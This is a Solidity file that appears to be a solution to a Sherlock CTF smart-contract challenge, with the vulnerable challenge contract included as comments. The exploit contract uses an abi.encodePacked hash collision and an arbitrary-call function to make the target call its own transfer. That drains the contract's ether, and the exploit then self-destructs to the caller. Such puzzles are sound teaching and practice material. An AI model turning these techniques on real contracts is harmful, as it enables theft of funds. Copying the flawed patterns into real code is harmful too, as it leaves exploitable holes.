// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "hardhat/console.sol";

interface IChallenge_ych18 {
    function func(
        address,
        uint256,
        bytes4
    ) external payable;

    function DontGiveUp(string calldata, string calldata) external;

    function transfer(address, uint256) external payable;
}

contract Exploit_ych18 {
    IChallenge_ych18 instance;

    constructor(IChallenge_ych18 _instance) {
        instance = _instance;
        // instance = IChallenge_ych18(address(new FunnyChallenges()));
    }

    function finalize() external payable {
        instance.DontGiveUp("SherlockCTF", " ");
        instance.func{value: 2 ether}(address(instance), 1, IChallenge_ych18.transfer.selector);
        // instance.transfer{value: 2 ether}(address(this), 1);

        console.log(address(instance).balance);
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {}

    receive() external payable {}
}

// contract FunnyChallenges {
//     bytes32 constant magic_hash = 0x841261bf11a58fbabcbcb7d4efd531da55121171dea830574030238956ac2eed;
//     bool private first_challenge_solved;

//     constructor() payable {}

//     function func(
//         address _contract,
//         uint256 _param,
//         bytes4 _sel
//     ) external payable {
//         require(msg.value >= 1 ether);
//         bytes memory data = abi.encodeWithSelector(_sel, msg.sender, _param);
//         (bool success, ) = _contract.call{value: msg.value}(data);
//         console.log(success);
//         require(success, "call failed");
//     }

//     function DontGiveUp(string calldata ch1, string calldata ch2) external {
//         require(keccak256(abi.encodePacked(ch2)) != keccak256(abi.encodePacked("CTF")), "NO Try again");
//         bytes memory ch2_bytes = bytes(ch2);
//         require(uint8(ch2_bytes[0]) != 84 && uint8(ch2_bytes[0]) != 70 && uint8(ch2_bytes[0]) != 67, "Nice Try but NOOOO!");

//         require(ch2_bytes.length <= 3, "You think of brute force? not a good idea");
//         bytes32 hash1 = keccak256(abi.encodePacked("Sherlock", "CTF "));
//         bytes32 hash2 = keccak256(abi.encodePacked(ch1, ch2));
//         if (hash1 == hash2) {
//             first_challenge_solved = true;
//         }
//     }

//     function transfer(address to, uint256 magic_number) public payable {
//         require(first_challenge_solved, "you should first solve DontGiveUp");
//         require(msg.value == 2 ether);

//         bytes32 hash_magic_number = keccak256(abi.encode(magic_number));

//         require(msg.sender == address(this) || hash_magic_number == magic_hash, "Please don't brute force :)");
//         (bool success, ) = to.call{value: address(this).balance}("");
//         require(success, "transfer failed");
//     }
// }
